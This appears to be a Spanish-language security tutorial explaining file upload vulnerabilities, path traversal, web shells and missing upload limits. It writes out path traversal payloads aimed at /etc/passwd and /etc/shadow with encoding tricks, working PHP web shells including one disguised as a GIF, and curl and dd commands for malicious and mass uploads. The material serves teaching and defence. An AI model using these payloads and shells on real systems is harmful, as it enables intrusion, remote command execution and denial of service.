¿Qué es lo que realmente pasó?

Para entender el problema, primero debemos entender cómo funciona un sistema de archivos.

En el nivel anterior, vimos un código problemático y cómo un atacante pudo explotarlo. Pero para entender realmente qué pasó, necesitamos profundizar en cada vulnerabilidad de forma detallada.

¿QUÉ ES UNA VULNERABILIDAD DE CARGA DE ARCHIVOS?

Una vulnerabilidad de carga de archivos ocurre cuando una aplicación web permite a los usuarios subir archivos sin implementar los controles de seguridad adecuados. Es como tener una puerta en tu casa que cualquiera puede abrir sin llave.

RazónExplicación
Acceso directo al servidorLos archivos subidos se guardan en el sistema de archivos del servidor
Ejecución de códigoAlgunos archivos pueden ser ejecutados por el servidor (PHP, JSP, ASPX)
Acceso a datos sensiblesUn atacante puede leer, modificar o eliminar archivos
Escalada de privilegiosDesde un web shell, el atacante puede tomar control total
🔴PATH TRAVERSAL (NAVEGACIÓN DE DIRECTORIOS)

¿Qué es exactamente? Path Traversal (también conocido como Directory Traversal) es una vulnerabilidad que permite a un atacante acceder a archivos y directorios fuera de la carpeta permitida utilizando la secuencia ../ para "subir" en la estructura de directorios.

¿Cómo funciona en la práctica?

📁 / (Raíz - El tronco principal)
├── 📁 home
│   └── 📁 usuario
│       ├── 📁 documentos
│       └── 📁 imagenes
├── 📁 etc
│   ├── 📄 passwd      ← ¡Archivo importante!
│   └── 📄 shadow      ← ¡Archivo muy importante!
├── 📁 var
│   └── 📁 www
│       └── 📁 html
│           └── 📁 uploads    ← ¡Aquí estamos!
└── 📁 tmp/

(raíz): Es el punto de partida, el "tronco" del árbol.
.. (doble punto): Significa "sube un nivel en el árbol".
.(punto): Significa "estoy aquí mismo"

Ejemplo Práctico de Ataque

// Código vulnerable (Java)
String fileName = request.getParameter("fileName");
File file = new File("/var/www/html/uploads/" + fileName);

El Ataque: el atacante envía en fileName el valor ../../../../etc/passwd, y la concatenación produce /etc/passwd, exponiendo archivos sensibles.

Técnicas de evasión que usan los atacantes

TécnicaEjemploCómo funciona
Codificación URL..%2f..%2f%2f es '/' codificado en URL
Doble codificación..%252f..%252fCodifica la codificación
Unicode..%c0%afRepresentación alternativa de '/'
Windows..\..\windows\win.iniUso de backslash en Windows
Null byte../../etc/passwd%00.jpgTermina la cadena antes de la extensión

¿Qué archivos puede leer?

SistemaArchivoInformación
Linux/Unix/etc/passwdUsuarios del sistema
Linux/Unix/etc/shadowContraseñas hasheadas
Aplicación/.envVariables de entorno (¡muy peligroso!)
WindowsC:\\Windows\\win.iniConfiguración del sistema

Ejemplo de petición maliciosa (HTTP):

GET /download?file=..%2f..%2f..%2f..%2fetc%2fpasswd HTTP/1.1
Host: vulnerable.com
User-Agent: Mozilla/5.0

# Respuesta (si es vulnerable):
HTTP/1.1 200 OK
Content-Type: text/plain

root:x:0:0:root:/root:/bin/bash
... (contenido de /etc/passwd)

Impacto del Path Traversal

  • 🔴 Robo de credenciales — lectura de /etc/passwd o /etc/shadow
  • 🔴 Exposición de código fuente — lectura del código de la aplicación
  • 🔴 Acceso a configuraciones — encuentra contraseñas de bases de datos
  • 🔴 Exfiltración de datos — roba datos de usuarios
  • 🔴 Escalada de privilegios — encuentra formas de obtener más acceso

🔴 CARGA DE ARCHIVOS SIN RESTRICCIONES (CWE-434)

¿Qué es exactamente? CWE-434 ocurre cuando una aplicación acepta archivos sin validar adecuadamente su tipo, contenido o ubicación de almacenamiento, permitiendo que los atacantes suban y ejecuten archivos maliciosos.

¿Cómo funciona el ataque?

graph TD
    A[Atacante] -->|1. Sube archivo malicioso| B[Servidor web]
    B -->|2. Guarda el archivo| C[Carpeta de uploads]
    C -->|3. Archivo está disponible| D[URL pública]
    A -->|4. Accede al archivo| D
    D -->|5. El servidor ejecuta| E[Código malicioso]
    E -->|6. Atacante toma control| F[Servidor comprometido]

Tipos de archivos peligrosos

Tipo de ArchivoExtensiónRiesgo
Scripts de servidor.php, .jsp, .aspxEjecución de código en el servidor
Archivos de configuración.htaccess, .iniModificación de configuración
Archivos HTML/JS.html, .htmXSS almacenado, phishing
Imágenes.jpg, .pngPueden contener código oculto

Ejemplo vulnerable (PHP):

<?php
// Define el destino donde se guardará la imagen
$target = "pictures/" . basename($_FILES['uploadedfile']['name']);

// Mueve el archivo subido a la nueva ubicación
if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target)) {
    echo "La imagen se ha subido correctamente.";
} else {
    echo "Hubo un error al subir la imagen.";
}
?>

Problemas comunes: no validar tipo, usar el nombre original, guardar en ubicación accesible y no verificar el contenido real.

Ejemplo de ataque con web shell

<?php
// shell.php - Web Shell básico
if (isset($_GET['cmd'])) {
    echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';
}
?>

# Acceso:
https://victima.com/uploads/shell.php?cmd=id

# Ejecución:
uid=33(www-data) gid=33(www-data) groups=33(www-data)

🔴 WEB SHELL (EL CABALLO DE TROYA)

Un Web Shell es un script malicioso que el atacante sube al servidor y que le permite ejecutar comandos del sistema operativo a través del navegador. Es como dejar una puerta trasera en tu servidor.

Anatomía de un Web Shell

graph TD
    A[Web Shell] --> B[Interfaz Web]
    A --> C[Ejecución de Comandos]
    A --> D[Gestión de Archivos]
    A --> E[Persistencia]

Tipos de Web Shells

  • Básico: una sola función para ejecutar comandos: <?php system($_GET['cmd']); ?>
  • Avanzado: múltiples funciones (cmd, upload, read, delete).
  • Encubierto: se camufla como imagen (imagen.jpg.php).
  • Persistente: se reinstala automáticamente si lo borran.

Ejemplo de Web Shell encubierto

<?php
// Este archivo parece una imagen pero es un web shell
GIF89a;
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>

Impacto: lectura de archivos, ejecución de comandos, subida/descarga de archivos, persistencia y control total del servidor.

🟡 SIN AUTENTICACIÓN

La falta de autenticación permite que cualquier persona suba archivos al sistema sin restricciones.

Consecuencias: anonimato del atacante, abuso de recursos, carga masiva y contenido inapropiado.

Ejemplo de ataque (sin autenticación)

# Subir archivo sin autenticación
curl -F "file=@malware.php" http://victima.com/upload

# Subir archivos masivamente
for i in {1..1000}; do
  curl -F "file=@/dev/zero?size=1000000000" http://victima.com/upload &
done

# Subir contenido ofensivo
curl -F "file=@contenido_ofensivo.html" http://victima.com/upload

🟡 SIN LÍMITE DE TAMAÑO

No restringir el tamaño de los archivos puede llevar a una Denegación de Servicio (DoS) por llenado de disco o consumo excesivo de recursos.

Ejemplo de ataque

# Crear archivo grande y subirlo
dd if=/dev/zero of=archivo_gigante bs=1M count=100000
curl -F "file=@archivo_gigante" http://victima.com/upload

# Zip bomb (ejemplo conceptual): 42.zip
# Capa 1: 42 KB → 42 MB
# Capa 2: 42 MB → 42 GB
# Capa 3: 42 GB → 42 TB
# Si el servidor intenta descomprimirlo, consume toda la memoria y CPU causando DoS
